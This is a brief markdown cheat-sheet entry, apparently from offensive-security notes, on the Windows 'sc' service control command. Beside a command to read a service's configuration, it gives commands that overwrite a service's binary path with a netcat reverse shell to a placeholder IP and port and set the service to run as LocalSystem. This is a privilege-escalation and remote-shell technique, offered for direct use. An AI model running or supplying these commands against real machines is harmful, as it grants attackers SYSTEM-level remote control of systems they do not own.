# sc

> service control

## get service config

    sc qc <service>

## overwrite service config value

    sc config <service> binpath= "C:\nc.exe -nv <ip> <port> -e C:\WINDOWS\System32\cmd.exe"
    sc config <service> obj= ".\LocalSystem" password= ""
